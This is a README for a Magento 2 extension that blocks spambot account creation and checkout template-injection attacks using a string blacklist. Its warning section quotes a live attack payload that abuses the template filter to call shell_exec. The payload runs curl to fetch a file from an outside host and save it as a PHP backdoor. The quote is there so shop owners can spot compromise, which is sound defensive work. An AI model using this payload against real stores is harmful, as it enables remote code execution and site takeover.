# Lazerbahn_Antispam

A customizable and simple Magento 2 extension for blocking (russian) spambots creating new customer accounts
and trying to hack Magento stores via template parameter injection in checkout.

This extension is based on https://github.com/Kreativsoehne/magento-2-simple-antispam but heavily extended.

## WARNING!

This extension has been rushed to production and probably requires some changes by developers for your purposes.
It's a quick and dirty patch for the current wave of hacking and spamming attacks.

There is NO GUARANTEE that this exception will make your shop safe!! 

If you find orders in your shop that contain something like this 

    var this.getTemplateFilter().filter(foobar)var this.getTemplateFilter().addAfterFilterCallback(shell_exec).filter(curl${IFS%??}-O${IFS%??}https://www.hacker.com/css/retro.css;mv${IFS%??}retro.css${IFS%??}a122.php")"

in the customer names that you have been targeted by an attack. Check the pub folder for new php files that 
have been placed there. Delete them immediately, they are backdoors! You want to erase and set up the whole
system anew! As far as I can tell, it seems only Apache servers are really affected because nginx-setups
only allow access to certain php files and the backdoor files are not in there. Nevertheless, even nginx servers
receive the php files. So, hackers are able to place files on a system which is scary enough.

This should only happen on outdated Magento 2 installs. Please update immediately!

## Installation
    1. $ composer require lazerbahn/magento2-simple-antispam
    2. $ ./bin/magento module:enable Lazerbahn_Antispam
    3. $ ./bin/magento setup:upgrade
	4. $ ./bin/magento setup:di:compile
    5. Profit.

## usage

This extension is very simple. By default, it won't perform a registration request Or create guest orders 
when some registration fields contain special strings on a blacklist:

You can specify those strings in the backend under Stores -> Configuration -> Lazerbahn -> Antispam-
After installation you need to activate the extension there. Currently, this will only deactivate the account creation
part. Sorry!

You can change the whole extension behaviour according to your need. Just edit this file:

    ./Plugin/Customer/Controller/Account/CreatePostPlugin.php

## how it works
It's a simple interceptor plugin which wraps the \Magento\Customer\Controller\Account\CreatePost::Execute() method 
into an around method.
It will search all specified form fields for the spam content by a simple iteration. The original Execute() 
method will only be called if there was no spam string detected.

For the guest checkout it goes through all the address fields and if it finds a blacklisted string it simple clears
the address. This leads to a standard error that address is missing and hacker is stuck.

## Notice:
This Extension is meant to be used as a skeleton by developers. It is very primitive and may need customization.
When installing via Composer, further upgrades will eliminate your customizations. Make sure to write an interceptor 
plugin by yourself, don't upgrade or use it as a local extension in the /app/code/ folder.

Probably there will be a future version, capable of defining blacklisted strings and form fields via Magento Admin 
We're happy about every contribution :)
